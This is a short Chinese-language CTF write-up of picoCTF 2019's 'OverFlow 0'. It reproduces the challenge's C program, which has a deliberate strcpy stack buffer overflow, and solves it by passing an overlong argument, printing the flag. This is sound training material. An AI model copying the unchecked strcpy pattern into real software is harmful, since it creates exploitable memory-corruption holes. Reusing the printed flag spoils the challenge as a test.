## OverFlow 0

題目:
>This should be easy. Overflow the correct buffer in this program and get a flag.
***
### 思路:
> 查看程式碼buf最大128byte，因此只要輸入大於128byte就會溢位，就會觸發sigsegv_handler印出flag

***
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
### 解法:
> 輸入大量的字母讓它溢位
```console
runmdy@pico-2019-shell1:/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{3asY_P3a5yb197d4e2}
```
### Flag:picoCTF{3asY_P3a5yb197d4e2} 
